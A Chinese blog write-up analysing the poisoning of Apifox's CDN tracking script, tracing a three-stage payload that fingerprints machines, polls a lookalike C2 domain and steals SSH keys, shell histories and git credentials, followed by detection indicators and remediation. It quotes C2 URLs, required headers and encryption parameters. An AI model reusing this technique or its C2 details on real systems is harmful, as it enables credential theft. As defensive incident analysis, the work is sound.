---
title: Apifox CDN 供应链投毒事件简单复盘 | 离别歌
source: https://www.leavesongs.com/PENETRATION/apifox-supply-chain-attack-analysis.html
source_host: www.leavesongs.com
clip_date: 2026-09-08T20:46:41+08:00
trace_id: fec93da0-ea0d-471b-bf0f-918d2f3348ff
content_hash: 9508e7e941b92f2af0b7cfcc5011eba0e7783c76c0a917dd0401199062dd2766
status: summarized
tags:
  - 恶意样本
  - 供应链投毒
series: null
feed_source: phithon·离别歌
ai_summary: Apifox 官方 CDN 埋点脚本遭供应链投毒，多阶段载荷窃取 SSH 密钥与账号信息；受影响桌面版需升级至 2.8.19+ 并轮换敏感凭据。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: null
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Apifox 官方 CDN 埋点脚本遭供应链投毒，多阶段载荷窃取 SSH 密钥与账号信息；受影响桌面版需升级至 2.8.19+ 并轮换敏感凭据。
> 
> - **影响范围：** 篡改对象为官方 CDN 上的 apifox-app-event-tracking.min.js，体积从约 34KB 增至约 77KB；2026 年 3 月 4 日至官方修复前，低于 2.8.19 的 Apifox 桌面版若启动过即可能中招。
> - **阶段一：** 恶意载荷附加在合法埋点后约 40KB，仅 Electron 桌面端有效；通过 require('crypto')、require('os') 读取网卡 MAC、CPU、主机名、用户名、OS，计算 SHA-256 存入 localStorage 的 `_rl_mc`，并把 RSA 加密后的用户名/主机名等作为 af_* 请求头；若存在 `common.accessToken`，会调官方接口获取账号信息一并上报；随后请求 C2，以 RSA-OAEP 解密响应并 eval，try/catch/finally 保证 30 分钟到 3 小时随机间隔持续轮询。
> - **C2 定位与阶段二：** 域名 apifox.it.com 近似官方，通过证书检索定位到东京 AWS 的 13.192.121.27；服务端校验 af_uuid、af_os、af_user、af_name 等自定义头后才下发有效载荷。带全头后返回 344 字节 RSA 密文，解密出 IIFE 动态加载 02ab429d.js 并立即移除 script 节点。
> - **阶段三窃密：** 02ab429d.js 约 3.6KB，无混淆；读取 ~/.ssh/、.zsh_history、.bash_history、.git-credentials 并执行 ps aux/tasklist；数据经 scrypt 派生密钥、AES-256-GCM 加密后 POST 至 apifox.it.com 的 /event/0/log。
> - **自查与处置：** 代理/DNS 日志出现 apifox.it.com 或相关路径即为强指示；客户端 Local Storage 出现 `_rl_mc`、`_rl_headers` 且含 af_uuid/af_user 也高度相关，也可在 Electron 用户数据目录的 Network Persistent State 或 LevelDB 中 strings 检索 apifox.it.com。处置优先级为升级客户端到 2.8.19+，轮换 Apifox 密码，并在备份后重新生成 SSH 密钥。

> 这是AI大模型根据我白天的分析过程简单编写的一篇文章，如果有错误或遗漏，还请见谅。我以后的文章并不会都用AI来写，不用担心。

2026 年 3 月 25 号，正当大家都还忙着应急LiteLLM投毒事件的同时，安全圈里开始流传一则不太寻常的消息：Apifox 桌面客户端疑似在官方 CDN 上的埋点脚本里被人动了手脚。

最初的披露来自 [2libra 上的梳理](https://2libra.com/post/network-security/8HvXoR_) ，已经点出了几个关键事实：被篡改的是 `https://cdn.apifox.com/www/assets/js/apifox-app-event-tracking.min.js` ，正常体积大约 34KB，投毒后胀到约 77KB；恶意逻辑会再去拉 `apifox.it.com` 上的脚本并执行。

由于我的电脑上也安装了 Apifox（虽然在 3 月份没有打开过），所以关注较多，想弄清攻击者的具体行为。复现时首先遇到的问题是： **公开讨论出现时，CDN 上的恶意文件往往已被替换，C2 也可能不可达。** 下文基于已有线索与归档，对攻击链与样本做梳理说明。

## 从 Wayback 获取阶段一样本

当前 CDN 上已为干净版本，因此从 **Internet Archive** 检索投毒期间的归档。@0cat 找到的快照时间为 UTC 2026-03-05 05:14:18：

`https://web.archive.org/web/20260305051418/https://cdn.apifox.com/www/assets/js/apifox-app-event-tracking.min.js`

文件结构为：前段为 Apifox 原有事件追踪代码，后段自 `_0x10e4()` 等符号起增加约 40KB，即合法埋点之后追加恶意载荷。

投毒段采用字符串数组与洗牌、RC4、代理函数、十六进制常量及反调试等常见混淆；若对代码做过度格式化，运行时可能触发反分析逻辑。手工逐行还原成本高，本文使用 Claude Code 进行分析，梳理了 C2、轮询间隔以及对 `require('crypto')` 等调用的关系。可读版本见 [https://gist.github.com/phith0n/7020c55bf241b2f3ccf5254192bd48a5](https://gist.github.com/phith0n/7020c55bf241b2f3ccf5254192bd48a5) ，下文仅给出结论，不重复贴源码。

[![1.png](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d01837c007cb06bb.png)](https://www.leavesongs.com/media/attachment/2026/03/26/5c151ed7-1145-49ff-97e4-dca3697ea1d8.png)

还原后的阶段一逻辑可以概括成「凑齐身份 → 带自定义头请求 C2 → 解密并 `eval` 」，且只在 **Electron 桌面端** 里跑得通：普通浏览器里没有同等的 `require('crypto')` 、 `require('os')` 路径。

脚本通过 `require('crypto')` 、 `require('os')` 读取网卡 MAC（排除回环与全零）、CPU 型号、主机名、系统用户名与 OS 类型，拼成字符串后做 **SHA-256**，结果写入 `localStorage` 的 `_rl_mc` ，并作为请求头里的 `af_uuid` 。操作系统版本以明文放在 `af_os` ；用户名与主机名用内嵌 **RSA 私钥** 经 `privateEncrypt` （PKCS#1 v1.5）打成 Base64，对应 `af_user` 、 `af_name` 。这些字段会缓存在 `_rl_headers` ，避免每次重复采集。

若 `localStorage` 里存在 Apifox 的 `common.accessToken` ，代码会用该 Token 调用官方接口 `https://api.apifox.com/api/v1/user` ，取出账号邮箱与显示名，再经 RSA 加密写入 `af_apifox_user` 、 `af_apifox_name` ，并合并回 `_rl_headers` 。阶段一因此同时上报机器指纹与「当前登录的 Apifox 账号」信息。

内嵌的同一套 **RSA 2048 私钥** 也用于处理 C2 回包：响应体按 256 字节分块，用 `privateDecrypt` 、OAEP（SHA-256）解成明文 JavaScript。 `loadAndExecute` 用 `fetch` 请求 `https://apifox.it.com/public/apifox-event.js` ，将拼好的对象作为 HTTP 头带上；若响应成功，对 **trim 后的正文** 解密后 **`eval` 执行**。

`try` / `catch` 中出错会静默忽略； `finally` 里固定调用 `scheduleNext()` ，在约 30 分钟～3 小时的随机间隔后再次 `setTimeout(loadAndExecute, …)` ，因此网络失败或 `eval` 抛错也不会停轮询。脚本末尾以 `void loadAndExecute()` 入口，加载后即跑第一轮。

阶段一不读取 `~/.ssh` 或 shell 历史，此类行为在后续 C2 下发的载荷中才出现，下文再写。

## 通过证书信息定位 C2

阶段一中下载并动态加载了 `https://apifox.it.com/public/apifox-event.js` 这个链接中的恶意代码，我们继续分析。

域名 `apifox.it.com` 与官方域名相近，公开分析阶段已无法正常解析。参考 @wfox 的做法，在 Quake 中使用 `cert:"apifox.it.com"` 检索证书字段，将服务定位到 **13.192.121.27** （东京 AWS EC2），对外为 nginx/1.28.2，后端为 Express。直接以 IP 访问返回 HTTP 404，表明对 Host 或路由存在过滤，而非对任意访问开放同一内容。

[![2.png](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b8eb18c146574334.png)](https://www.leavesongs.com/media/attachment/2026/03/26/77978efb-ad00-4ba3-8aa3-c7514afa7cf2.png)

## 依赖自定义 HTTP 头的阶段二响应

将 `apifox.it.com` 解析到上述 IP 后，若仅发送默认 `GET /public/apifox-event.js` ，常见结果为 HTTP 200 与空响应体。对照反混淆代码可知，服务器需要客户端携带一组自定义请求头，例如 `af_uuid` （机器指纹哈希）、 `af_os` 、 `af_user` 、 `af_name` 等，其中部分字段经 RSA 处理。缺少或不符合要求时不下发有效载荷，默认 `curl` 难以直接获取内容。

请求头齐全后，响应体为 **344 字节 RSA 密文**；使用阶段一样本中提取的私钥，按 `rsaDecrypt` （OAEP、SHA-256）解密得到 IIFE：向 `document.head` 插入 `<script src="https://apifox.it.com/02ab429d.js">` ，在 `onload` 中从 DOM 移除该节点。

[![3.png](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5afddb06166f16d7.png)](https://www.leavesongs.com/media/attachment/2026/03/26/8edfe8ad-dac9-4874-8602-af2c35a7900f.png)

阶段一已通过 `eval` 执行远程代码；阶段二改为由 `<script>` 加载第三阶段，加载后移除节点，可降低在 DOM 中残留脚本标签的概率。

## 第三阶段：明文窃密载荷

`02ab429d.js` 约 3.6KB，未再叠加混淆层，可直接阅读。

[![4.png](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8dd38097e3d3ad9d.png)](https://www.leavesongs.com/media/attachment/2026/03/26/382c7d2e-8f74-4c1b-9532-57b21240ce7a.png)

这个脚本在 macOS / Linux 上读取 `~/.ssh/` （递归）、`.zsh_history` 、`.bash_history` 、`.git-credentials` ，并执行 `ps aux` ；在 Windows 上读取 `%USERPROFILE%\.ssh\` 并执行 `tasklist` 。数据经 `JSON.stringify` 、gzip 压缩后，使用 `scrypt("apifox", "foxapi", 32)` 派生密钥，以 AES-256-GCM 加密，通过 HTTPS POST 提交至 `https://apifox.it.com/event/0/log` ， `Content-Type` 为 `text/plain` ，可能用于与常见文本请求在流量特征上接近。

阶段一载荷附着在合法埋点之后，依赖 Electron 环境内的 `require('crypto')` 、 `require('os')` 等接口；在普通浏览器中通常不具备相同能力。阶段一从 `localStorage` 读取 `common.accessToken` ，调用 `https://api.apifox.com/api/v1/user` 获取邮箱与用户名等信息，并在请求 C2 时写入 `af_*` 等头部。 `loadAndExecute` 使用 `try/catch/finally` ，在 `finally` 中调用 `scheduleNext()` ，以约 30 分钟至 3 小时的随机间隔再次执行；即使本次请求或 `eval` 失败，仍会调度下一轮。

阶段二仅负责加载第三阶段脚本并移除 script 节点，不包含上述窃密逻辑。阶段一内嵌 RSA 私钥：外发数据使用 `privateEncrypt` （PKCS1），接收 C2 响应使用 `privateDecrypt` （OAEP、SHA-256）。C2 持有对应公钥即可解密客户端上报内容；下行载荷需使用公钥加密，故仅从样本中提取私钥无法伪造服务器下发的密文，但足以解密阶段二响应。该设计侧重实现成本与对下行内容的控制，而非防止已获样本的分析方还原阶段二。

## 自查与修复

### 是否可能中招

满足以下 **任一** 条件时，基本确认中招：

1.  **时间与版本**：在 **2026 年 3 月 4 日** 至官方修复前，曾使用 Apifox **桌面版** 且版本 **低于 2.8.19** （含在此期间启动过客户端，即使使用频率不高）。
2.  **网络侧**：防火墙、代理或 DNS 日志中出现对 **`apifox.it.com`** 或报告中的关联域名的出站访问；或存在对 `GET /public/apifox-event.js` 、 `GET /02ab429d.js` 、 `POST /event/0/log` 等路径的请求记录。
3.  **客户端存储（开发者工具）**：在 Apifox 桌面版打开开发者工具（Windows / Linux： `Ctrl+Shift+I` ，macOS： `Cmd+Option+I` ），在 **Application → Local Storage** 或 **Console** 中检查是否存在键 **`_rl_mc`**、 **`_rl_headers`**；若 `_rl_headers` 内容中出现 **`af_uuid`**、 **`af_user`** 等与样本一致的字段，与恶意行为高度相关。
4.  **本机数据目录（离线排查）**：不依赖客户端是否还能打开开发者工具时，可直接查 Electron/Chromium 写在磁盘上的状态。在 Apifox 用户数据目录中找到名为 **`Network Persistent State`** 的文件（无扩展名），用文本编辑器或 `strings` 搜索其中是否出现 **`apifox.it.com`**，若出现则说明本机曾对该域名产生过网络层相关记录。常见路径包括：Windows 为 `%APPDATA%\apifox\Network\Network Persistent State` ；通过 Scoop 安装的，多为 `<scoop 根目录>\apps\apifox\current\UserData\Network\Network Persistent State` （以本机 `current` 实际指向为准）。此外可在 **Local Storage 对应的 LevelDB** 中检索键名 **`rl_mc`**、 **`rl_headers`** （与运行时 Local Storage 中的 `_rl_mc` 、 `_rl_headers` 相对应）；macOS 上该目录通常在 `~/Library/Application Support/Apifox/Local Storage/leveldb` 。LevelDB 为二进制存储，需用 `strings` 、十六进制编辑或 LevelDB 查看工具检索， **不建议** 在未备份的情况下手工改库。

以上第 2、3、4 项（网络与存储侧）为强指示；仅版本与时间重合但无日志、无上述痕迹时，仍建议完成版本升级与凭据轮换中的「低风险项」（如升级客户端、修改 Apifox 密码并重新登录）。

### 处置（建议按优先级执行）

**1\. 升级客户端**  
安装 **2.8.19 或更高版本**。该版本将相关埋点改为安装包内资源，不再从 CDN 拉取同一路径脚本，可阻断同一投毒入口的复现。

**2\. SSH 密钥**  
恶意样本会读取 `~/.ssh/` （Windows 为用户目录下 `.ssh` ）。在已完成备份的前提下，视情况在服务器上移除旧公钥、本机重新生成密钥对并轮换部署；
